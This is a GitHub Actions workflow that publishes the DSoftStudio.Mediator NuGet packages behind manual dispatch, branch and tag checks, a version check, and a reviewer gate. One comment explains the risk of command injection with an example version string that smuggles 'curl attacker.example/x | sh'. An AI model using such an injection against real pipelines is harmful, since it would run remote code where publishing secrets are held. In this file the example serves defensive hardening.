name: Publish

# ════════════════════════════════════════════════════════════════════════
#  Publication happens when a human presses "Run workflow" in the Actions
#  tab. Nothing else triggers it — not a push, not a tag, not a merge.
#
#  It used to ride along with CI: every push to main published to GitHub
#  Packages, so a commit that touched only README.md shipped a package.
#  Releasing is a decision, and a decision needs someone to make it.
#
#  The job rebuilds and re-runs the tests from the commit you select
#  rather than downloading an artifact CI left behind. It costs about two
#  minutes and removes the question "was that artifact built from this
#  code?" — which is the question you would be asking at the worst moment.
# ════════════════════════════════════════════════════════════════════════

on:
  workflow_dispatch:
    inputs:
      target:
        description: 'Where to publish'
        type: choice
        required: true
        default: github-packages
        options:
          - github-packages
          - nuget.org
      version:
        description: 'Version of DSoftStudio.Mediator you intend to publish (e.g. 1.4.0-rc.1)'
        type: string
        required: true
      include_companions:
        description: 'Also publish FluentValidation / HybridCache / OpenTelemetry'
        type: boolean
        required: true
        default: true

permissions:
  contents: read

jobs:
  # ════════════════════════════════════════════════════════════════════════
  #  Job 1 — decide, build, and SAY what would be published.
  #
  #  Nothing here reaches a feed. It ends by writing a manifest naming every
  #  package, its exact version, and whether that version already exists on the
  #  target feed — which is the thing the button cannot tell you, because the
  #  companions carry their own versions and move independently of the mediator.
  # ════════════════════════════════════════════════════════════════════════
  pack:
    name: Build and verify
    runs-on: ubuntu-latest

    steps:
      # ── nuget.org is main-only, and this is a FAILING step on purpose ──
      #
      # workflow_dispatch lets whoever presses the button choose the ref from a
      # dropdown, so without this check the release branch, a feature branch or
      # a pull-request head could all push to nuget.org. A version there can be
      # unlisted but never replaced or removed, so "published from the wrong
      # branch" has no undo.
      #
      # Deliberately a step that fails rather than a job-level `if:` that skips.
      # A skipped job renders as a pale check in the Actions list and reads as
      # "ran, nothing to do" — which is precisely the wrong impression when what
      # actually happened is that a release was refused.
      #
      # GitHub Packages stays available from any branch: that is the rehearsal
      # target, and being able to push a build of a feature branch to it is the
      # reason there are two options here at all.
      #
      # Every value below reaches the shell through env, never through ${{ }}
      # inside the script. See the note on the tag step for why.
      - name: Refuse to publish to NuGet.org from anywhere but main
        if: inputs.target == 'nuget.org' && github.ref != 'refs/heads/main'
        env:
          REF: ${{ github.ref }}
        run: |
          echo "::error::NuGet.org can only be published from main. This run is on '$REF'."
          echo "Merge to main first, then run this workflow again with main selected."
          exit 1

      # fetch-depth: 0 because the tag checks below need the tags and enough
      # history to prove the tagged commit is reachable from main. The default
      # shallow clone has neither.
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      # ── nuget.org publishes a TAG, not a branch tip ──
      #
      # The button is pressed with main selected, but what gets built is the
      # commit the release tag points at. Those are not the same thing: main
      # moves, and a release must not. Tagging v1.4.0 and then merging one more
      # PR would otherwise change what "publishing 1.4.0" means.
      #
      # The tag still has to be reachable from main, so this cannot be used to
      # ship a tag placed on a side branch — which is the loophole that makes
      # "publish from main" meaningless if left open.
      #
      # Tags here are annotated (v1.3.0 is a tag object, not a commit), so the
      # ^{commit} dereference is load-bearing, not decoration.
      #
      # VERSION arrives as an environment variable rather than being pasted into
      # the script by ${{ }}. That substitution happens BEFORE the shell sees the
      # line, so a version of
      #     1.4.0"; curl attacker.example/x | sh; echo "
      # would be executed, not compared -- inside the one job that holds
      # NUGET_API_KEY and GH_PKG_TOKEN. As $VERSION it is only ever data.
      #
      # `version` is a free-text input, so this is reachable by anyone who can
      # press the button. The other inputs are choice/boolean and GitHub
      # constrains them, but they go through env too: which inputs the platform
      # happens to validate is not a thing to have to remember.
      - name: Require a release tag, reachable from main
        if: inputs.target == 'nuget.org'
        env:
          VERSION: ${{ inputs.version }}
        run: |
          set -e
          tag="v$VERSION"

          if ! git rev-parse -q --verify "refs/tags/$tag" >/dev/null; then
            echo "::error::No tag '$tag' exists. Tag the release commit first: git tag -a $tag -m $tag && git push origin $tag"
            echo "Tags that do exist:"
            git tag --list --sort=-v:refname | head -10
            exit 1
          fi

          tagged=$(git rev-parse "$tag^{commit}")

          # HEAD, not origin/main: the guard above already pinned this run to
          # refs/heads/main, so HEAD is main's tip and is a local ref that is
          # certain to exist. Whether actions/checkout leaves a usable
          # refs/remotes/origin/main behind is an implementation detail this
          # check should not depend on.
          if ! git merge-base --is-ancestor "$tagged" HEAD; then
            echo "::error::Tag '$tag' points at $tagged, which is not reachable from main."
            echo "A release has to be a commit that is on main. Merge it first, then move the tag."
            exit 1
          fi

          echo "RELEASE_SHA=$tagged" >> "$GITHUB_ENV"
          echo "Publishing $tag -> $tagged"

      # Everything from here on builds the tagged commit rather than the tip of
      # main. For GitHub Packages there is no tag and RELEASE_SHA is unset, so
      # this is a no-op and the rehearsal still builds whatever branch you chose.
      - name: Check out the tagged commit
        if: inputs.target == 'nuget.org'
        run: git checkout --detach "$RELEASE_SHA"

      - name: Setup .NET 10
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'

      # .NET 8 is needed by the sample projects
      - name: Setup .NET 8
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '8.0.x'

      - name: Restore
        run: dotnet restore DSoftStudio.Mediator.slnx

      - name: Build
        run: dotnet build DSoftStudio.Mediator.slnx -c Release --no-restore

      # A red test stops the publish. Same suite CI runs, no shortcut: the
      # whole point of this workflow is that what ships was verified from the
      # source it shipped from.
      - name: Test
        run: dotnet test DSoftStudio.Mediator.slnx -c Release --no-build

      - name: Pack
        env:
          INCLUDE_COMPANIONS: ${{ inputs.include_companions }}
        run: |
          mkdir -p nupkgs
          dotnet pack src/DSoftStudio.Mediator.Abstractions -c Release --no-build -o nupkgs
          dotnet pack src/DSoftStudio.Mediator -c Release --no-build -o nupkgs
          if [ "$INCLUDE_COMPANIONS" = "true" ]; then
            dotnet pack src/DSoftStudio.Mediator.FluentValidation -c Release --no-build -o nupkgs
            dotnet pack src/DSoftStudio.Mediator.HybridCache     -c Release --no-build -o nupkgs
            dotnet pack src/DSoftStudio.Mediator.OpenTelemetry   -c Release --no-build -o nupkgs
          fi

      # The typed version has to match what the build actually produced.
      #
      # This is the guard that matters. Every package carries its own <Version>
      # in its csproj, and they do not move together — the mediator can be at
      # 1.4.0-rc.1 while HybridCache sits at 1.0.10-rc.1. Without this check the
      # button publishes whatever happens to be on the branch, which is exactly
      # the accident this workflow exists to prevent. Typing the version means
      # you looked.
      - name: Verify the built version is the one you asked for
        env:
          VERSION: ${{ inputs.version }}
        run: |
          set -e
          expected="nupkgs/DSoftStudio.Mediator.$VERSION.nupkg"
          if [ ! -f "$expected" ]; then
            echo "::error::Asked to publish $VERSION, but the build produced no such package."
            echo "What the build produced:"
            ls -1 nupkgs/
            echo
            echo "The <Version> in src/DSoftStudio.Mediator/DSoftStudio.Mediator.csproj is what decides this."
            exit 1
          fi
          echo "Matched $expected"

      # ── The manifest, and the reason this job exists separately ──
      #
      # `version` covers DSoftStudio.Mediator and nothing else. Every companion
      # carries its own <Version> and they move independently -- the mediator can
      # be at 1.4.0-rc.1 while HybridCache sits at 1.0.10-rc.1 -- so ticking
      # "also publish the companions" published three versions nobody had named
      # anywhere in the form.
      #
      # This prints them, and for nuget.org asks the feed whether each already
      # exists. A version that is already there will be skipped by
      # --skip-duplicate and costs nothing; a version that is NOT there is about
      # to become permanent, because nuget.org lets you unlist but never replace
      # or remove. The two cases deserve to look different to whoever is reading.
      - name: Write the publish manifest
        env:
          TARGET: ${{ inputs.target }}
        run: |
          set -e
          {
            echo "### Would publish to \`$TARGET\`"
            echo
            echo "| Package | Version | Already on the feed? |"
            echo "|---|---|---|"
          } >> "$GITHUB_STEP_SUMMARY"

          for f in nupkgs/*.nupkg; do
            base=$(basename "$f" .nupkg)
            id=$(echo "$base" | sed -E 's/\.[0-9]+\.[0-9]+\.[0-9]+.*$//')
            ver=${base#"$id."}

            state='— (not checked for this feed)'
            if [ "$TARGET" = "nuget.org" ]; then
              lower=$(echo "$id" | tr '[:upper:]' '[:lower:]')
              # -F and -x, not a regex: a version is full of dots, and a dot in a
              # pattern matches any character. "1.4.0-rc.1" as a regex also matches
              # "1x4x0-rcx1", which would report a version as already published when
              # it is not -- the exact direction that makes this table dangerous.
              # Commas are stripped with the quotes so each line is a bare version.
              if curl -sf --max-time 20 "https://api.nuget.org/v3-flatcontainer/$lower/index.json"                    | tr -d ' ",' | grep -qxF "$ver"; then
                state='yes — `--skip-duplicate` makes this a no-op'
              else
                state='**NO — this push is permanent**'
              fi
            fi

            echo "| \`$id\` | \`$ver\` | $state |" >> "$GITHUB_STEP_SUMMARY"
            echo "  $id  $ver  $state"
          done

      - name: Upload packages
        uses: actions/upload-artifact@v4
        with:
          name: nupkgs
          path: nupkgs/*
          retention-days: 7

  # ════════════════════════════════════════════════════════════════════════
  #  Job 2 — the only place anything leaves this repository.
  #
  #  Separate from `pack` so the GitHub Environment gate lands BETWEEN the
  #  manifest and the push. On one job the approval fired before checkout, and
  #  a reviewer was asked to approve with nothing to look at; now job 1's
  #  summary is on screen -- every package, every version, and which ones are
  #  about to become permanent -- when the request arrives.
  #
  #  The environment names are NOT the input values, and the mapping is the
  #  point. `nuget-publish` already exists in Settings -> Environments with
  #  yandersr as a required reviewer. Naming the environment after the input
  #  would have asked for `nuget.org`, which does not exist -- GitHub creates a
  #  missing environment on the fly with NO protection rules, so the gate that
  #  was already configured would have been silently bypassed by a job that
  #  looked like it had one.
  #
  #  Adding a target here means adding a case below. That is deliberate: the
  #  mapping should be something someone wrote down, not something derived from
  #  a dropdown label.
  # ════════════════════════════════════════════════════════════════════════
  push:
    name: Push to ${{ inputs.target }}
    needs: pack
    runs-on: ubuntu-latest
    environment: ${{ inputs.target == 'nuget.org' && 'nuget-publish' || 'github-packages' }}

    permissions:
      contents: read
      packages: write

    steps:
      - name: Download the packages job 1 built
        uses: actions/download-artifact@v4
        with:
          name: nupkgs
          path: nupkgs

      - name: List what arrived
        run: ls -la nupkgs/

      - name: Push to GitHub Packages
        if: inputs.target == 'github-packages'
        env:
          GH_PKG_TOKEN: ${{ secrets.GH_PKG_TOKEN }}
        run: >
          dotnet nuget push "nupkgs/*.nupkg"
          --source "https://nuget.pkg.github.com/DSoftStudio/index.json"
          --api-key "$GH_PKG_TOKEN"
          --skip-duplicate

      # --skip-duplicate is what makes "publish everything" safe: a companion
      # whose version has not moved is a no-op rather than an error, so the
      # button does not have to be told which packages changed.
      # The branch condition is repeated here on purpose. The guard step above
      # protects this one only for as long as nobody adds continue-on-error,
      # reorders the steps, or copies this job into a new workflow. Making the
      # push itself unconditionally branch-aware means the irreversible action
      # carries its own precondition instead of inheriting one.
      - name: Push to NuGet.org
        if: inputs.target == 'nuget.org' && github.ref == 'refs/heads/main'
        env:
          NUGET_API_KEY: ${{ secrets.NUGET_API_KEY }}
        run: >
          dotnet nuget push "nupkgs/*.nupkg"
          --source "https://api.nuget.org/v3/index.json"
          --api-key "$NUGET_API_KEY"
          --skip-duplicate
